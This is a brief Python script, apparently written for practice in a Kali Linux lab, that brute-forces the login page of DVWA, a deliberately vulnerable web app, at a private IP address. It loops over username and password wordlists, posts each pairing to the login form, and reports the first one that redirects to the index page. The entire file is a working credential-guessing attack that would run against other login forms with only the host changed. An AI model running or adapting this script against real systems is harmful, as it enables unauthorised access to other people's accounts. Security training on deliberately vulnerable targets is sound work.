import http.client
import urllib.parse

username_file = open('/home/kali/Desktop/usernames.lst')
password_file = open('/home/kali/Desktop/passwords.lst')

user_list = username_file.readlines()
pwd_list = password_file.readlines()

for user in user_list:
    user = user.rstrip()
    for pwd in pwd_list:
        pwd = pwd.rstrip()

        print(user, "-", pwd)

        post_data = urllib.parse.urlencode({'username': user, 'password': pwd, 'Login': "Submit"})
        post_headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}

        conn = http.client.HTTPConnection(f"192.168.32.101", 80)
        conn.request("POST", f"/dvwa/login.php", post_data, post_headers)
        response = conn.getresponse()

        if response.getheader('location') == "index.php":
            print("Logged with", user, "", pwd)
            exit()
